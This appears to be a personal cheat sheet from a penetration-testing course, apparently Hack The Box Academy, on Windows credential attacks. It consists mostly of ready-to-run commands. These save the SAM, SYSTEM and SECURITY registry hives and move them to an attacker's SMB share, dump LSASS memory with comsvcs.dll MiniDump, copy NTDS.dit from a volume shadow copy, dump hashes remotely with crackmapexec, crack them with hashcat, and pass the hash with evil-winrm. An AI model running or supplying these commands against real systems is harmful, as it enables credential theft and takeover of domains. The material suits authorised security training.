# Attacking SAM
## Using reg.exe save to Copy Registry Hives
Launching CMD as an admin will allow us to run reg.exe to save copies of the aforementioned registry hives. Run these commands below to do so:
```
reg.exe save hklm\sam C:\sam.save
```
```
reg.exe save hklm\system C:\system.save
```
```
reg.exe save hklm\security C:\security.save
```
## Creating a Share with smbserver.py
```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/kali/Documents/
```
## Moving Hive Copies to Share
```
move sam.save \\[attackerIP]\CompData
```
```
move system.save \\[attackerIP]\CompData
```
```
move security.save \\[attackerIP]\CompData
```
## Dumping Hashes with Impacket's secretsdump.py
```
impacket-secretdump -sam sam.save -security security.save -system system.save LOCAL
```
## Cracking Hashes with Hashcat
```
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```



## crackmapexec
### Remote Dumping & LSA Secrets Considerations
```
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```
### Dumping SAM Remotely
```
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```
# Attacking LSASS
## Task Manager Method
```
Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file
```
```
Local Security Authority Process
Create dump file
```
##### A file called lsass.DMP is created and saved in:
```
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```
##### Transfer the file to our attack host
Running Pypykatz
```
pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```
## Rundll32.exe & Comsvcs.dll Method
Before issuing the command to create the dump file, we must determine what process ID (PID) is assigned to lsass.exe. This can be done from cmd or PowerShell:
##### Finding LSASS PID in cmd
```
tasklist /svc
```
##### Finding LSASS PID in PowerShell
```
Get-Process lsass
```
##### Creating lsass.dmp using PowerShell
```
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
With this command, we are running rundll32.exe to call an exported function of comsvcs.dll which also calls the MiniDumpWriteDump (MiniDump) function to dump the LSASS process memory to a specified directory (C:\lsass.dmp). 

Mimikatz and Pypykatz can extract the DPAPI masterkey for the logged-on user whose data is present in LSASS process memory. This masterkey can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts.
##### Cracking the NT Hash with Hashcat
```
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```



# Attacking Active Directory & NTDS.dit
Once a Windows system is joined to a domain, it will no longer default to referencing the SAM database to validate logon requests. That domain-joined system will now send all authentication requests to be validated by the domain controller before allowing a user to log on. This does not mean the SAM database can no longer be used. Someone looking to log on using a local account in the SAM database can still do so by specifying the hostname of the device proceeded by the Username (Example: WS01/nameofuser) or with direct access to the device then typing ./ at the logon UI in the Username field. 
When we find ourselves in a scenario where a dictionary attack is a viable next step, we can benefit from trying to custom tailor our attack as much as possible.
Often, an email address's structure will give us the employee's username (structure: username@domain). For example, from the email address jdoe@inlanefreight.com, we see that jdoe is the username.
## Creating a Custom list of Usernames
Let's say we have done our research and gathered a list of names based on publicly available information. We will keep the list relatively short for the sake of this lesson because organizations can have a huge number of employees. Example list of names:
```
Ben Williamson
Bob Burgerstien
Jim Stevenson
Jill Johnson
Jane Doe
```
We can manually create our list(s) or use an automated list generator such as the Ruby-based tool Username Anarchy to convert a list of real names into common username formats. Once the tool has been cloned to our local attack host using Git, we can run it against a list of real names as shown in the example output below:
```
https://github.com/urbanadventurer/username-anarchy
```
```
./username-anarchy -i /home/ltnbob/names.txt 
```
##### Launching the Attack with CrackMapExec
```
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

## Capturing NTDS.dit
To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights. We also will want to check what domain privileges we have.
### Creating Shadow Copy of C:
We can use vssadmin to create a Volume Shadow Copy (VSS) of the C: drive or whatever volume the admin chose when initially installing AD.
```
Evil-WinRM PS C:\> vssadmin CREATE SHADOW /For=C:\
```
### Copying NTDS.dit from the VSS
```
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
Pay attention the `HarddiskVolumeShadowCopy<NUMBER>`
### You need the system.save file as well
```
reg SAVE HKLM\SYSTEM C:\NTDS\SYSTEM
```
### Transferring NTDS.dit to Attack Host
```
Evil-WinRM PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```
A Faster Method: Using cme to Capture NTDS.dit
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
## A Faster Method: Using cme to Capture NTDS.dit
```
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```
### After capturing the NTDS.dit file
```
impacket-secretsdump -ntds /home/htb-ac-944115/Desktop/NTDS.dit -hashes lmhash:nthash LOCAL -outputfile ntlmHashes -system /home/htb-ac-944115/Desktop/system.save 
```
#### Cracking a Single Hash with Hashcat
```
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```
#### Pass-the-Hash Considerations
Pass-the-Hash with Evil-WinRM Example
```
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```
# Credential Hunting in Windows
## Lazagne
Lazagne to quickly discover credentials that web browsers or other installed applications may insecurely store.
```
start lazagne.exe all
```
## Using findstr
```
C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```